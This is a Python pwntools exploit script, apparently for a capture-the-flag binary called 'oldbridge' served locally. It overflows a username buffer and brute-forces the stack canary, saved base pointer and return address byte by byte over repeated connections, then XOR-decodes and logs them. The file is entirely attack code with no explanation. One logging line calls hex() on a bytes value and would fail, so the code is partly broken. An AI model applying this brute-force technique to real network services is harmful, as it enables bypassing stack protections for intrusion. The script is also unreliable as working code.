#!/usr/bin/python3
from pwn import *

context.binary = exe = ELF('./oldbridge',checksec=False)


def bruteforce_value(payload: bytes) -> bytes:  
    value = b''

    while len(value) < 8:
        for c in range(256):

            p = remote('127.0.0.1',1234)
            p.sendafter(b'Username: ', payload + value + p8(c))

            try:
                p.recvline()
                value += p8(c)
                break
            except EOFError:
                pass
            finally:
                    p.close()

    return value
def xor(payload):
    return bytes([c ^ 0xd for c in payload])

offset = 1026
username = b'davide'
payload = username + b'A' * offset

canary = bruteforce_value(payload)
canary_xor = xor(canary)

input()
save_rbp = bruteforce_value(payload + canary)
xor_save_rbp = xor(save_rbp)
log.info(f'save_rbp: {hex(u64(xor_save_rbp))}')

ret_address = bruteforce_value(payload + canary + save_rbp)

xor_ret_address = xor(ret_address)
log.info(f'ret address: {hex(xor_ret_address)}')
log.info(f'save_rbp: {hex(u64(xor_save_rbp))}')
log.info(f'canary {hex(u64(canary_xor))}')



